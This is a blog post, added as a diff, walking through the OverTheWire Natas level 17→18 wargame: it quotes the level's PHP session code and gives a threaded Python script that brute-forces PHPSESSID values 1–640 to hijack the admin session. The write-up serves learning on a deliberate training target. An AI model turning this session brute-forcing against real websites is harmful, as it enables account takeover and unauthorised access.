@@ -1,0 +1,108 @@
+---
+layout: post
+title:  "Natas Level 17 → Level 18"
+date:   2021-05-29 18:42:56
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: Bill never said that!
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+The natas18 tells us to login to get the credentials for the next level. The form allows us to enter in a username and password. We can also view the source code.  Due to the length of the code, I'll only included selected sections.
+
+First, the form does not allow the admin to log in.
+
+```php
+function isValidAdminLogin() { 
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+```
+
+Second, the site uses PHPSESSID to track the user session.
+
+```php
+function my_session_start() { 
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+```
+
+Third, the session id is between 1 and 640, inclusive.
+
+```php
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    ...
+```
+
+```php
+function createID($user) { 
+    global $maxid;
+    return rand(1, $maxid);
+}
+```
+
+```php
+$maxid = 640; // 640 should be enough for everyone
+```
+
+The one thing we don't see is the password being used for anything. Enter in anything other than admin for the username and anything for the password, then click Login. Now open your browser's Developer Tools (F12 in Firefox) and click on the Storage tab (again in Firefox) to view the value stored in PHPSESSID.
+
+If you were to delete this cookie, go back to main page for natas19 and enter the same information into the form, you'd get a different session id. This means that every user gets an random id between 1 and 640, including the admin. Since the search space is so small, we should be able to bruteforce the id fairly quickly.
+
+As we saw when we logged in, we're greeted with, "You are logged in as a regular user" when we first logged in. While we can get the admin greeting from the source, we don't need it. We'll simply look for the absence of this line to let us know when we've found the correct id.
+
+You'll need to add the current level password to the script. The script takes just over 4 seconds to run on my computer.
+
+```python
+#!/usr/bin/env python
+import requests
+from requests.auth import HTTPBasicAuth
+import concurrent.futures
+
+natas18_password = 'x------------------------------P'
+session = requests.Session()
+
+
+def get_phpsessid(id):
+    resp = requests.get('http://natas18.natas.labs.overthewire.org/index.php',
+                        cookies={"PHPSESSID": str(id)},
+                        auth=HTTPBasicAuth('natas18', natas18_password))
+
+    if "You are logged in as a regular user" not in resp.text:
+        print(f'The admin id is {id}')
+        print(resp.text)
+        exit(0)
+
+
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    executor.map(get_phpsessid, list(range(641)))
+```
